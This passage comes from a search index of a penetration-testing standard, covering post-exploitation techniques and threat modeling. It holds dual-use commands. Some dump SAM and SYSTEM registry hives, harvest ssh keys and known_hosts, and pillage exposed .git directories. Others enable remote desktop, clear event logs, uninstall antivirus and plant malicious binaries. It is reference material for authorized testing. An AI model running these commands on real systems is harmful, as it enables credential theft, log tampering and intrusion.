ESSIDs to identify places visited","title":"Wifi"},{"location":"pentest_standard/tecguidelines/#source-code-repos","text":"< Contribution Needed > SVN CVS MS Sourcesafe WebDAV","title":"Source Code Repos"},{"location":"pentest_standard/tecguidelines/#git","text":"Git is a distributed version control system (DVCS) and the meta directory (.git) contains all the necessary information to re-create the state of the repository at any given point in time. Git is often used to deploy web applications and the .git meta directory is sometimes available to pillage. '''Identify the repo''' One quick way to find the repo is to look for the file http://example.com/.git/HEAD and see if it contains a match to ^ref: refs/ W3AF ( http://w3af.sourceforge.net/ ) contains a discovery plugin named findGit.py that will assist in finding git repositories of web targets. Note: the .git directory is not always present in the root, but sometimes in sub directories depending on how a part of the application is deployed. Something like http://example.com/blog/.git/ '''Cloning the repo''' git clone http://example.com/ If an error like this is the result of the clone attempt then you have to resort to pillaging in different ways as the repo is not easily cloneable. fatal: http://example.com/info/refs not found: did you run git update-server-info on the server? '''Check for directory browsing''' If directory browsing is open for http://example.com/.git/objects then wget can be used to download the repo and then re-construct it. Example: wget -m \u2014no-parent http://example.com/.git cd example.com git reset \u2014hard '''Other useful data''' If both of these scenarios fail to get you the contents of the git repo there is still other information that may be of value. These files with predictable file names can contain very useful information and are detailed below. .git/index \u201cThe index is a binary file (generally kept in .git/index) containing a sorted list of path names, each with permissions and the SHA1 of a blob object; git ls-files can show you the contents of the index:\u201d ( http://book.git-scm.com/7_the_git_index.html )","title":"Git"},{"location":"pentest_standard/tecguidelines/#platform-details-php-cgi-etc","text":"","title":"Platform details (.php, .cgi, etc)"},{"location":"pentest_standard/tecguidelines/#files-that-may-contain-configuration-details-that-are-not-rendered","text":"","title":"Files that may contain configuration details (that are not rendered)"},{"location":"pentest_standard/tecguidelines/#old","text":"","title":".old"},{"location":"pentest_standard/tecguidelines/#new","text":"","title":".new"},{"location":"pentest_standard/tecguidelines/#bak","text":"","title":".bak"},{"location":"pentest_standard/tecguidelines/#targz","text":"","title":".tar.gz"},{"location":"pentest_standard/tecguidelines/#txt","text":"","title":".txt"},{"location":"pentest_standard/tecguidelines/#database-dumps-sql","text":"mkdir example.com cd example.com mkdir .git wget get http://example.com/.git/index -O .git/index git init . git ls-files .git/config Contains repo locations, usernames / email addresses, possibly other targets one could attack. .git/logs/HEAD Contains commit messages if any editing and committing has been done on the server. .git/hooks/* There are a number of files in the hooks directory that may contain sensitive information depending on the environment.","title":"Database dumps .sql"},{"location":"pentest_standard/tecguidelines/#identify-custom-apps","text":"< Contribution Needed >","title":"Identify custom apps"},{"location":"pentest_standard/tecguidelines/#backups","text":"< Contribution Needed > Locally stored backup files Central backup server Remote backup solutions Tape storage","title":"Backups"},{"location":"pentest_standard/tecguidelines/#business-impact-attacks","text":"< Contribution Needed > *What makes the biz money *Steal It","title":"Business impact attacks"},{"location":"pentest_standard/tecguidelines/#further-penetration-into-infrastructure","text":"< Contribution Needed > *Botnets","title":"Further penetration into infrastructure"},{"location":"pentest_standard/tecguidelines/#pivoting-inside","text":"Linux Commands --Show users that have used ssh to connect to this host. grep publickey /var/log/secure*|awk '{print 9\"\\t\" 9\"\\t\" 11\"\\t\"$NF}'|sort -u user1 ::ffff:10.0.0.1 ssh2 user2 ::ffff:10.0.0.2 ssh2 user3 ::ffff:10.0.0.3 ssh2 --Show users that have used sudo. grep sudo /var/log/secure*|awk -F: '{print $4}'|sort -u user1 root user2 user4 --Show users with active cron use. cat /var/log/cron* |awk '$6 !~ /Updated/ {print $6}'|tr -d ()|sort -u root user5 user1 user2 --Look at a users password settings. passwd -S user","title":"Pivoting inside"},{"location":"pentest_standard/tecguidelines/#passwd-s-appuser","text":"Password locked.","title":"passwd -S appuser"},{"location":"pentest_standard/tecguidelines/#passwd-s-root","text":"Password set, MD5 crypt.","title":"passwd -S root"},{"location":"pentest_standard/tecguidelines/#passwd-s-bin","text":"Alternate authentication scheme in use. --Users that have connected and from where. for i in $(ls /var/log/wtmp*);do last -adf {i}|awk ' {i}|awk ' 1 !~ /wtmp/ {print 1, 1, NF}'|sort -u; done user1 testhost.example.com root testhost2.example.com user2 prodhost.example.com --Who is logged in right now and from where. $ who -Hu NAME LINE TIME IDLE PID COMMENT user1 pts/0 Jun 2 10:39 . 28001 (testhost.example.com) --Pull IPv4 hosts from /etc/hosts, drop commented entries and localhost. egrep -v \"^[ \\t] #|^[ \\t] $|localhost\" /etc/hosts 10.0.0.1 testhost.example.com testhost 10.0.0.2 testhost2.example.com testhost2 10.0.0.3 testhost3.example.com testhost3 --Pull commented IPv4 hosts from /etc/hosts egrep \"^[ \\t] #+[ \\t] ([0-9]{1,3}.){3}[0-9]{1,3}\" /etc/hosts","title":"passwd -S bin"},{"location":"pentest_standard/tecguidelines/#10004-testhost4examplecom-testhost4","text":"--Pull IPv6 hosts from /etc/hosts egrep \"(([:xdigit:]{0,4}):?:{1}){0,7}:?:{1}([:xdigit:]{0,4})?\" /etc/hosts ::1 loopback localhost # loopback (lo0) name/address ::1FFF ipv6test.example.com ipv6test --Pull hostnames from known_hosts files for any user home you have access to read. for i in $(awk -F: '{print $6}' /etc/passwd|sort -u); do awk '{print $1}' ${i}/.ssh/known_hosts 2> /dev/null;done|tr ',' '\\n'|sort -u testhost testhost3 testhost4 ipv6test prodhost --Show private keys and if they are encrypted for i in $(grep \"PRIVATE\" *|egrep -v \"END\"|awk -F: '{print $1}'); do print ${i};grep ENCRYPTED ${i};echo;done id_dsa id_dsap Proc-Type: 4,ENCRYPTED id_rsa32k Proc-Type: 4,ENCRYPTED id_rsa512 id_rsa512p Proc-Type: 4,ENCRYPTED --Look at the public keys and pull their type. Numerical types are SSH protocol 1. for i in $(ls *.pub);do print ${i};awk '{print $1}' ${i};echo;done id_dsa.pub ssh-dss id_dsap.pub ssh-dss id_rsa16k.pub ssh-rsa id_rsadef.pub ssh-rsa identity2048.pub 2048 identity768p.pub 768 identity864.pub 864 Windows Commands Token Stealing and Reuse Password Cracking Wifi connections to other devices Password Reuse Keyloggers User enumeration From Windows DC or from individual machines Linux passwd file MSSQL Windows Auth users","title":"10.0.0.4  testhost4.example.com testhost4"},{"location":"pentest_standard/tecguidelines/#historylogs","text":"Linux {| | align#\"left\"| date |Display date and time |- | df |Display disk free space |- | iostat |Kernel I/O statistics |- | netstat |Network status and throughput |- | lsof |List of open files |- | ps |Process information |- | top |Display and update sorted process information |- | who |Display who is on the system Check ssh known hosts file Log files to see who connects to the server |- |} .bash_history and other shell history files syslog MySQL * MySQL History * syslog Windows * Event Logs * Recent opened files * Browsers * Favorites * stored passwords * stored cookies * browsing history * browser cache files * syslog","title":"History/Logs"},{"location":"pentest_standard/tecguidelines/#cleanup","text":"< Contribution Needed > *Ensure documented steps of exploitation *Ensure proper cleanup *Remove Test Data *Leave no trace *Proper archiving and encryption of evidence to be handed back to customer *Restore database from backup where necessary","title":"Cleanup"},{"location":"pentest_standard/tecguidelines/#persistence","text":"< Contribution Needed > Autostart Malware Reverse Connections Rootkits User Mode Kernel Based C&C medium (http, dns, tcp, icmp) Backdoors Implants VPN with credentials","title":"Persistence"},{"location":"pentest_standard/tecguidelines/#post-exploitation","text":"Post-exploitation activities are those that are conducted once a system as been compromised. These activities vary based upon the type of operating system. They can very from running simple \"whoami\" to enumerating local accounts.","title":"Post Exploitation"},{"location":"pentest_standard/tecguidelines/#windows-post-exploitation","text":"","title":"Windows Post Exploitation"},{"location":"pentest_standard/tecguidelines/#blind-files","text":"(Things to pull when all you can do is to blindly read) LFI/Directory traversal(s). Files that will have the same name across networks / Windows domains / systems. {| ! align#\"left\"| File ! Expected Contents / Description |- | %SYSTEMDRIVE%\\boot.ini |A file that can be counted on to be on virtually every windows host. Helps with confirmation that a read is happening. |- | %WINDIR%\\win.ini |This is another file to look for if boot.ini isn\u2019t there or coming back, which is some times the case. |- | %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM |It stores users' passwords in a hashed format (in LM hash and NTLM hash). |- | %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\RegBack\\system | |}","title":"Blind Files"},{"location":"pentest_standard/tecguidelines/#non-interactive-command-execution","text":"{| ! align#\"left\"| ! |- ! | |}","title":"Non Interactive Command Execution"},{"location":"pentest_standard/tecguidelines/#system","text":"{| ! align#\"left\"|Command ! Expected Output or Description |- | |Lists your current user. Not present in all versions of Windows; however shall be present in Windows NT 6.0-6.1. |- | whoami /all |Lists current user, sid, groups current user is a member of and their sids as well as current privilege level. |- | set |Shows all current environmental variables. Specific ones to look for are USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE. |- | fsutil fsinfo drives |Must be an administrator to run this, but it lists the current drives on the system. |- | reg query HKLM /s /d /f \"C:* *.exe\" | find /I \"C:\\\" | find /V \"\"\"\" |Locates insecurely registered executables within the system registry on Windows 7. |}","title":"System"},{"location":"pentest_standard/tecguidelines/#networking-ipconfig-netstat-net","text":"{| ! align#left\"|Command ! Expected Output or Description |- | ipconfig /all |Displays the full information about your NIC\u2019s. |- | ipconfig /displaydns |Displays your local DNS cache. |- | netstat -nabo | |- | netstat -s -p [tcp|udp|icpm|ip] | |- | netstat -r | |- | netstat -na | findstr :445 | |- | netstat -nao | findstr LISTENING |XP and up for -o flag to get PIDnet acc |- | netstat -nao | findstr LISTENING |XP and up for -o flag to get PID |- | netstat -na | findstr LISTENING | |- | netsh diag show all | |- | net view |Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup. |- | net view /domain net view /domain:otherdomain | |- | net user %USERNAME% /domain |Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership |- | net user /domain |Lists all of the domain users |- | net accounts |Prints the password policy for the local system. This can be different and superseded by the domain policy. |- | net accounts /domain |Prints the password policy for the domain |- | net localgroup administrators |Prints the members of the Administrators local group |- | net localgroup administrators /domain |As this was supposed to use localgroup & domain, this actually another way of getting current domain admins |- | net group \u201cDomain Admins\u201d /domain |Prints the members of the Domain Admins group |- | net group \u201cEnterprise Admins\u201d /domain |Prints the members of the Enterprise Admins group |- | net group \u201cDomain Controllers\u201d /domain |Prints the list of Domain Controllers for the current domain |- | nbtstat -a [ip here] | |- | net share |Displays your currently shared SMB entries, and what path(s) they point to |- | net session | find / \u201c\\\u201d | |- | arp -a |Lists all the systems currently in the machine\u2019s ARP table. |- | route print |Prints the machine\u2019s routing table. This can be good for finding other networks and static routes that have been put in place |- | browstat |Not working on XP | |} http://www.securityaegis.com/ntsd-backdoor/","title":"Networking (ipconfig, netstat, net)"},{"location":"pentest_standard/tecguidelines/#configs","text":"{| ! align#left\"|Command ! Expected Output or Description |- | gpresult /z |Extremely verbose output of GPO (Group policy) settings as applied to the current system and user |- | sc qc | |- | sc query | |- | sc queryex | |- | type %WINDIR%\\System32\\drivers\\etc\\hosts | Print the contents of the Windows hosts file |- | dir %PROGRAMFILES% |Prints a directory listing of the Program Files directory. |- | echo %COMSPEC% |Usually going to be cmd.exe in the Windows directory, but it\u2019s good to know for sure. |}","title":"Configs"},{"location":"pentest_standard/tecguidelines/#finding-important-files","text":"{| ! align#left\"|Command ! Expected Output or Description |- | tree C: /f /a > C:\\output_of_tree.txt |Prints a directory listing in \u2018tree\u2019 format. The /a makes the tree printed with ASCII characters instead of special ones and the /f displays file names as well as folders |- | dir /a | |- | dir /b /s [Directory or Filename] | |- | dir /s /b | find /I \u201csearchstring\u201d |Searches the output of dir from the root of the drive current drive () and all sub drectories (/s) using the \u2018base\u2019 format (/b) so that it outputs the full path for each listing, for \u2018searchstring\u2019 anywhere in the file name or path. |- | command | find /c /v \u201c\u201d |Counts the lines of whatever you use for \u2018command\u2019 | |}","title":"Finding Important Files"},{"location":"pentest_standard/tecguidelines/#files-to-pull-if-possible","text":"{| ! align#left\"|File location !Description / Reason |- | %SYSTEMDRIVE%\\pagefile.sys |Large file, but contains spill over from RAM, usually lots of good information can be pulled, but should be a last resort due to size |- | %WINDIR%\\debug\\NetSetup.log | |- | %WINDIR%\\repair\\sam | |- | %WINDIR%\\repair\\system | |- | %WINDIR%\\repair\\software | |- | %WINDIR%\\repair\\security | |- | %WINDIR%\\iis6.log |iis5.log, ii6.log or iis7.log | |- | %WINDIR%\\system32\\logfiles\\httperr\\httperr1.log |IIS 6 error log |- | %SystemDrive%\\inetpub\\logs\\LogFiles |IIS 7\u2019s logs location |- | %WINDIR%\\system32\\logfiles\\w3svc1\\exYYMMDD.log |Year month day |- | %WINDIR%\\system32\\config\\AppEvent.Evt | |- | %WINDIR%\\system32\\config\\SecEvent.Evt | |- | %WINDIR%\\system32\\config\\default.sav | |- | %WINDIR%\\system32\\config\\security.sav | |- | %WINDIR%\\system32\\config\\software.sav | |- | %WINDIR%\\system32\\config\\system.sav | |- | %WINDIR%\\system32\\CCM\\logs*.log | |- | %USERPROFILE%\\ntuser.dat | |- | %USERPROFILE%\\LocalS 1\\Tempor 1\\Content.IE5\\index.dat | |- | %WINDIR%\\System32\\drivers\\etc\\hosts | |}","title":"Files To Pull (if possible)"},{"location":"pentest_standard/tecguidelines/#remote-system-access","text":"{| ! align#left\"|Command !Description / Reason |- | net share \\computername | |- | tasklist /V /S computername | |- | qwinsta /SERVER:computername | |- | qprocess /SERVER:computername * | |- | net use \\computername |This maps IPC$ which does not show up as a drive but allows you to access the remote system as the current user. This is less helpful as most commands will automatically make this connection if needed |- | net use \\computername /user:DOMAIN\\username password |Using the IPC$ mount use a user name and password allows you to access commands that do not usually ask for a username and password as a different user in the context of the remote system. This is useful when you\u2019ve gotten credentials from somewhere and wish to use them but do not have an active token on a machine you have a session on. |- | reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f |Enable remote desktop. |- | reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f |Enable remote assistance |- | net time \\computername |Shows the time of target computer) |- | dir \\computername\\share_or_admin_share |dir list a remote directory |- | tasklist /V /S computername |Lists tasks w/users running those tasks on a remote system. This will remove any IPC$ connection after it is done so if you are using another user, you need to re-initiate the IPC$ mount |}","title":"Remote System Access####"},{"location":"pentest_standard/tecguidelines/#auto-start-directories","text":"ver Returns kernel version - like uname on *nix) {| ! align#left\"|Version !Location |- |Windows NT 6.1, 6.0 |%SystemDrive%\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ |- |Windows NT 5.2, 5.1, 5,0 |%SystemDrive%\\Documents And Settings\\All Users\\Start Menu\\Programs\\StartUp\\ |- |Windows 9x |%SystemDrive%\\wmiOWS\\Start Menu\\Programs\\StartUp\\ |- |Windows NT 4.0, 3.51, 3.50 |%SystemDrive%\\WINNT\\Profiles\\All Users\\Start Menu\\Programs\\StartUp\\ |}","title":"Auto-Start Directories"},{"location":"pentest_standard/tecguidelines/#binary-planting","text":"{| ! align#left\"|Location / File name !Reason / Description |- | msiexec.exe |Idea taken from here: http://goo.gl/E3LTa - basically put evil binary named msiexec.exe in Downloads directory and when a installer calles msiexec without specifying path, you get code execution. |- | %SystemRoot%\\System32\\wbem\\mof\\ |Taken from stuxnet: http://blogs.iss.net/archive/papers/ibm-xforce-an-inside-look-at-stuxnet.pdf Look for Print spooler vuln |} WMI * wmic bios wmic ** wmic qfe get hotfixid ***This gets patches IDs ** wmic startup ** wmic service ** wmic process ***Get caption,executablepath,commandline ** wmic process call create \u201cprocess_name\u201d ***Executes a program wmic process where name#\u201dprocess_name\u201d call terminate ***Terminates program ** wmic logicaldisk where drivetype#3 get name, freespace, systemname, filesystem, size, volumeserialnumber ***Hard drive information ** wmic useraccount ***Usernames, sid, and various security related goodies ** wmic useraccount get /ALL ** wmic share get /ALL ***You can use ? for gets help ** wmic startup list full ***This can be a huge list!!! ** wmic /node:\"hostname\" bios get serialnumber ***This can be great for finding warranty info about target Reg Command exit * reg save HKLM\\Security security.hive (Save security hive to a file) ** reg save HKLM\\System system.hive (Save system hive to a file) ** reg save HKLM\\SAM sam.hive (Save sam to a file) ** reg add [\\TargetIPaddr] [RegDomain][ \\Key ] ** reg export [RegDomain][Key] [FileName] ** reg import [FileName ] ** reg query [\\TargetIPaddr] [RegDomain][ Key ] /v [Valuename!] (you can to add /s for recurse all values )","title":"Binary Planting"},{"location":"pentest_standard/tecguidelines/#deleting-logs","text":"wevtutil el (list logs) wevtutil cl (Clear specific lowbadming) del %WINDIR%*.log /a /s /q /f","title":"Deleting Logs"},{"location":"pentest_standard/tecguidelines/#uninstalling-software-antivirus-non-interactive","text":"wmic product get name /value (this gets software names) wmic product where name#\"XXX\" call uninstall /nointeractive (this uninstalls software)","title":"Uninstalling Software \u201cAntiVirus\u201d (Non interactive)"},{"location":"pentest_standard/tecguidelines/#other","text":"pkgmgr usefull /iu :\u201dPackage\u201d pkgmgr usefull /iu :\u201dTelnetServer\u201d (Install Telnet Service ...) pkgmgr /iu:\u201dTelnetClient\u201d (Client ) rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-) wscript.exe","title":"Other"},{"location":"pentest_standard/threatmodeling/","text":"General This section defines a threat modeling approach as required for a correct execution of a penetration testing. The standard does not use a specific model, but instead requires that the model used be consistent in terms of its representation of threats, their capabilities, their qualifications as per the organization being tested, and the ability to repeatedly be applied to future tests with the same results. The standard focuses on two key elements of traditional threat modeling - assets and attacker (threat community/agent). Each one is respectively broken down into business assets and business processes and the threat communities and their capabilities. As a minimum, all four elements should be clearly identified and documented in every penetration test. When modeling the attacker side, on top of the threat community (which is mostly semantic and can be tied back to the organization\u2019s business SWOT analysis), and the capabilities (which is mostly technical), additional aspects of motivation modeling should also be provided. These additional points essentially take into account the value of the different assets available at the target and are combined with the cost of acquiring it. As a complementary model, impact modeling should also be performed for the organization in order to provide a more accurate view of the \u201cwhat-if?\u201d scenario surrounding the loss event of each of the identified assets. This should take into account the assets \u201cnet\u201d value, its intrinsic value, and other indirectly incurred costs associated with a loss event. The threat modeling phase of any penetration testing engagement is critical for both the testers, as well as the organization. It provides clarity as far as the organization\u2019s risk appetite and prioritization (which assets are more important than others? what threat communities are more relevant than others?). Additionally, it enables the tester to focus on delivering an engagement that closely emulates the tools, techniques, capabilities, accessibility and general profile of the attacker, while keeping in mind what are the actual targets inside the organization such that the more relevant controls, processes, and infrastructure are put to the test rather than an inventory list of IT elements. The threat model should be constructed in coordination with the organization being tested whenever possible, and even in a complete black-box situation where the tester does not have any prior information on the organization, the tester should create a threat model based on the attacker\u2019s view in combination with OSINT related to the target organization. The model should be clearly documented, and be delivered as part of the final report as the findings in the report will reference the threat model in order to create a more accurate relevance and risk score that is specific to the organization (rather than a generic technical one). High level threat modeling process Gather relevant documentation Identify and categorize primary and secondary assets Identify and categorize threats and threat communities Map threat communities against primary and secondary assets Example In the light of a PTES assessment the internally hosted CRM application may be in scope. The customer information stored in the back-end database is an easily identifiable primary asset as it is directly linked to the application in scope. However, by reviewing the technical design of the database server, it can also be identified that the HR database stored on the same back-end database server is a secondary asset. An attacker can use the CRM application as a stepping stone to obtain employee information. In a basic threat modeling exercise, certain threat communities may be identified as not relevant when mapped to the CRM application, but by identifying the secondary assets the threat landscape suddenly changes. High level modeling tools There are a variety of tools available to identify targets and map attack vectors. These normally focus on the business assets (what systems to target) and business processes (how to attack them.) Depending on the engagement, the penetration testing team may perform these exercises with no input from the customer; or they may spend a lot of time with customer stakeholders identifying targets of interest. Tools with a business asset focus usually require a quantitative input to describe how important each potential target is to test. The inputs may also be qualitative, such as a description by the customer\u2019s CIO that a system is mission-critical. Tools focused on business processes, information flows and technical architecture are used to identify potential attack vectors and choose which are mostly likely to succed or most likely to be used by a certain class of adversary. Business Asset Analysis During the business asset analysis part of the threat modeling exercise an asset-centric view is taken on all assets, and business processes they support them, included in the scope. By analyzing the gathered documentation and interviewing relevant personnel within the organization, the pentester is able to identify the assets that are most likely to be targeted by an attacker, what their value is and what the impact of their (partial) loss would be. Organizational Data Policies, Plans, and Procedures Internal policies, plans, and procedures define how the organization does business. These documents are of particular interest as they can help identify key roles within an organization and critical business processes that keep a company running. Product Information (e.g. trade secrets, R&D data) Product related information includes any patents, trade secrets, future plans, source code, supporting systems that directly affect the product market value, algorithms, and any other information that the organization regards as a key factor to the business success of such product. Marketing Information (plans, roadmaps, etc.) Marketing plans for promotions, launches, product changes, positioning, partnerships, 3 rd party providers, business plans related to activities inside or outside the organization. Additionally, PR related data such as details of partners, reporters, consulting firm, and any correspondence with such entities is also considered a highly sought after target. Financial Information (e.g. bank, credit, equity accounts) Financial information is often some of the most guarded information an organization possesses. This information can include bank account information, credit card account information and/or credit card numbers, and investment accounts, among others. Technical Information Technical information about the organization, and the organization\u2019s operations, is of unique interest to the penetration tester. Such information is often not the expected deliverable of a penetration test, however, it facilitates the testing process by feeding valuable information to other areas; infrastructure design information may provide valuable data to the Intelligence Gathering process. * Infrastructure Design Information Infrastructure design related information pertains to all the core technologies and facilities used to run the organization. Building blueprints, technical wiring and connectivity diagrams, computing equipment/networking designs, and application level data processing are all considered infrastructure design information. * System Configuration Information System configuration information includes configuration baseline documentation, configuration checklists and hardening procedures, group policy information, operating system images, software inventories, etc. This information could aid the discovery of vulnerabilities (such as through the knowledge of configuration errors or outdated software installations). * User Account Credentials User account credentials help facilitate access to the information system, at a non-privileged level, as long as a means to authenticate exists (e.g. VPN, web portal, etc.). * Privileged User Account Credentials Privileged user account credentials help facilitate access to the information system, at an elevated level of access, as long as a means to authenticate exists (e.g. VPN, web portal, etc.). Obtaining privileged user account credentials often leads to compromise of the information system being tested. Employee Data Here employee data is being analyzed as any data that can have a DIRECT affect on the organization is obtained or compromised by an attacker. Organizations that have to adhere to some compliance which places fines on the loss or exposure of such data are obvious candidates for such a direct loss effect. Also, organizations who\u2019s employees may be considered critical assets may also be subjected to such scrutiny (specific government bodies, specialized trade secret related employees/departments, etc\u2026). The following list provides examples to information realms of personal data that may be considered business assets for the threat modeling. * National Identification Numbers (SSNs, etc.) * Personally Identifiable Information (PII) * Protected Health Information (PHI) * Financial Information (e.g. bank, credit accounts) Customer Data Much like employee data, customer data is considered a business asset in the threat modeling process when such information will incur a direct/indirect loss to the organization. On top of regulatory/compliance need (based on fines), an additional factor comes into play here when such data can be used to conduct fraud, where the organization may be held liable or sued for the losses related to the fraud (based on losing the customer information that enabled the fraud to take place). The following list provides examples of such information realms that may hold relevant customer data and should be considered business assets for the sake of the threat modeling * National Identification Numbers (SSN\u2019s, etc.) * Personally Identifiable Information (PII) * Protected Health Information (PHI) * Financial Accounts (e.g. bank, credit, equity accounts) * Supplier Data Information related to suppliers that is considered critical to the organization (such as critical component manufacturers, agreements with suppliers that may be part of a trade secret, cost analysis of supplied components), as well as any data that may be used to affect the business operations of the organization through its suppliers is considered a business asset. * Partner Data * \u201cCloud\u201d Service Account Information Human Assets When identifying human assets in an organization, we have to remember that the context is having such assets part of a greater effort to compromise the organization. As such, human assets that are identified as business assets are those that could be leveraged to divulge information, manipulated to make decisions or actions that would adversely affect the organization or enable an attacker to further compromise it. Human assets are not necessarily the highest up within the corporate hierarchy, but are more often key personnel that are related to previously identified business assets, or are in positions to enable access to such assets. This list can also include employees that normally would not be associated with access to restricted company assets, but may be in a position to grant physical access to a company that facilitates a breach of security or procedure. The following list provides some examples of such assets, and should be adapted to the organization being tested. * Executive Management * Executive Assistants * Middle Management * Administrative Assistants * Technical/Team Leads * Engineers * Technicians * Human Resources Business Process Analysis A business isn't a business if it doesn't make money. The way this happens is by having either raw goods or knowledge run through various processes to enhance them and create added value. This generates revenue. Business processes and the assets (people, technology, money) supporting them form value chains. By mapping these processes, identifying the critical vs. non-critical processes and eventually finding flaws in them we are able to understand how the business works, what makes them money and eventually how specific threat communities can make them lose money. In the business process analysis we differentiate between critical business processes, and non-critical processes. For each category the analysis is the same, and takes into account the same elements. The main difference is in the weighting that the threat from a critical business process is assigned with as opposed to a non-critical one. Nevertheless, it's imperative to remember that an aggregation of a few non-critical business processes can be combined into a scenario that essentially forms a critical flaw within an element/process. Such threat scenarios should also be identified within this phase and mapped out for later use in the penetration test. Technical infrastructure supporting process As business processes are usually supported by IT infrastructure (such as computer networks, processing power, PCs for entering information and managing the business process, etc...), all those elements must be identified and mapped. Such mapping should be clear enough to be used later on in the process when translating the threat model to the vulnerability mapping and exploitation. Information assets supporting process Contrary to technical infrastructure, information assets are existing knowledge bases in the organization that are used as either a reference, or as support material (decision making, legal, marketing, etc...). Such assets are usually identified in the business process already, and should be mapped alongside the technical infrastructure, as well as any additional technical infrastructure that supports the information assets themselves. Human assets supporting process Identification of the HR that are involved in the business process should be made in conjunction with the process analysis itself (whether documented or not), and every person that has any kind of involvement (even if it does not relate to a specific information asset or a technical infrastructure element) should be documented and mapped in the process. Such HR assets are usually part of an approval sub-process, a verification sub-process, or even a reference (such as legal advice). These kinds of assets (especially ones that have no relation to information assets or technical infrastructure) would be later mapped to attack vectors that are more social than technical in nature. 3 rd party integration and/or usage of/by process Similar to human assets supporting the process, any 3 rd party that has any involvement with the business process should be mapped as well. This category can be tricky to map out, as it could contain both human assets, as well as information/technical ones (such as a SaaS provider). Threat Agents/Community Analysis When defining the relevant threat communities and agents, a clear identification of the threat should be provided in terms of location (internal / external to the organization), the specific community within the location, and any additional relevant information that would assist in establishing a capabilities/motivation profile for the specific agent/community. Where possible, specific agents should be identified. Otherwise, a more general community should be outlined, along-with any supporting material and intelligence. Some examples of threat agent/community classifications are: {| class#\"wikitable\" |- ! Internal ! External |- | Employees | Business Partners |- | Management (executive, middle) | Competitors |- | Administrators (network, system, server) | Contractors |- | Developers | Suppliers |- | Engineers | Nation States |- | Technicians | Organized Crime |- | Contractors (with their external users) | Hacktivists |- | General user community | Script Kiddies (recreational/random hacking) |- | Remote Support | |} Employees Persons working directly for the company under a part-time or full-time contract. In general they are not regarded as posing a severe threat as most of them are relying on the company to make a living and, assuming they are treated well, are inclined to protect the company rather than to hurt it. Oftentimes involved in data loss incidents or accidental compromise. In rare cases they may be motivated by outsiders to assist in intrusions or they may engage in malicious acts on their own (e.g. rogue traders). While the skill level may vary, it is usually low to medium. Management (Executive, middle) Employees working directly for the company as described above. Given their position and function within the company they oftentimes have access to privileged information and may Threat Capability Analysis Once a threat community has been identified, the capabilities of said community must also be analyzed in order to build an accurate threat model that reflects the actual probability of such a community/agent to successfully act upon the organization and compromise it. This analysis requires both a technical analysis as well as an opportunity analysis (where applicable). Analysis of tools in use Any tools that are known to be available to the threat community/agent are to be included here. Additionally, tools that may be freely available should be analyzed for the required skill level needed to be able to utilize them to their potential, and mapped in the threat capability. Availability to relevant exploits/payloads The threat community/agent should be analyzed in terms of its capability to either obtain or develop exploits for the environment relevant to the organization. Additionally, accessibility to such exploits/payloads through 3 rd parties, business partners, or underground communities should also be to taken into account in this analysis. Communication mechanisms An analysis of communication mechanisms available to the threat agent/community should be made to evaluate the complexity of attacks against an organization. These communication mechanisms range from simple and openly available technologies such as encryption, through to specialist tools and services such as bulletproof hosting, use of drop-sites, and the use of known or unknown botnets to perform attacks or mask source information. For example, as part of testing we test to see what the overall attack surface for an organization is from the outside. However, there is another whole component that is often times missed. What types of threats can exist post exploitation? This falls under the context of detecting exfiltration channels. Coincidentally, penetration testers are uniquely situated to test an organizations capability to detect command and control channels of today's modern malware. When this is in scope, we recommend the tester create a series of malware specimens that increase the level of obfuscation used to hide C2. The goal is to create malware that is easily detected, then increase the obfuscation to the point where detection no longer occurs. Accessibility The final element in the threat actor capability analysis is their accessibility to the organization and/or the specific assets in question. Completing the profile depicted above while factoring in accessibility analysis would enable the penetration test to create clear scenarios that are relevant to the organization\u2019s risk. Motivation Modeling The possible motivation of threat agents/communities should be noted for further analysis. Motivations of attackers are constantly changing, as can be seen by the increase in hacktivism branded attacks by groups such as Anonymous and Antisec. There will be subtle differences in unique motivations based on each organization and/or vertical market, some common motivations include : * Profit (direct or indirect) * Hacktivism * Direct grudge * Fun / Reputation * Further access to partner/connected systems Finding relevant news of comparable Organizations being compromised In order to provide a complete threat model, a comparison to other organizations within the same industry vertical should be provided. This comparison should include any relevant incidents or news related to such organizations and the challenges they face. Such a comparison is used to validate the threat model and offer a baseline for the organization to compare itself to (taking into account that this publicly available information only represents a portion of the actual threats and incidents the compared organization actually face).","title":"Threat Modeling"},{"location":"pentest_standard/threatmodeling/#general","text":"This section defines a threat modeling approach as required for a correct execution of a penetration testing. The standard does not use a specific model, but instead requires that the model used be consistent in terms of its representation of threats, their capabilities, their qualifications as per the organization being tested, and the ability to repeatedly be applied to future tests with the same results. The standard focuses on two key elements of traditional threat modeling - assets and attacker (threat community/agent). Each one is respectively broken down into business assets and business processes and the threat communities and their capabilities. As a minimum, all four elements should be clearly identified and documented in every penetration test. When modeling the attacker side, on top of the threat community (which is mostly semantic and can be tied back to the organization\u2019s business SWOT analysis), and the capabilities (which is mostly technical), additional aspects of motivation modeling should also be provided. These additional points essentially take into account the value of the different assets available at the target and are combined with the cost of acquiring it. As a complementary model, impact modeling should also be performed for the organization in order to provide a more accurate view of the \u201cwhat-if?\u201d scenario surrounding the loss event of each of the identified assets. This should take into account the assets \u201cnet\u201d value, its intrinsic value, and other indirectly incurred costs associated with a loss event. The threat modeling phase of any penetration testing engagement is critical for both the testers, as well as the organization. It provides clarity as far as the organization\u2019s risk appetite and prioritization (which assets are more important than others? what threat communities are more relevant than others?). Additionally, it enables the tester to focus on delivering an engagement that closely emulates the tools, techniques, capabilities, accessibility and general profile of the attacker, while keeping in mind what are the actual targets inside the organization such that the more relevant controls, processes, and infrastructure are put to the test rather than an inventory list of IT elements. The threat model should be constructed in coordination with the organization being tested whenever possible, 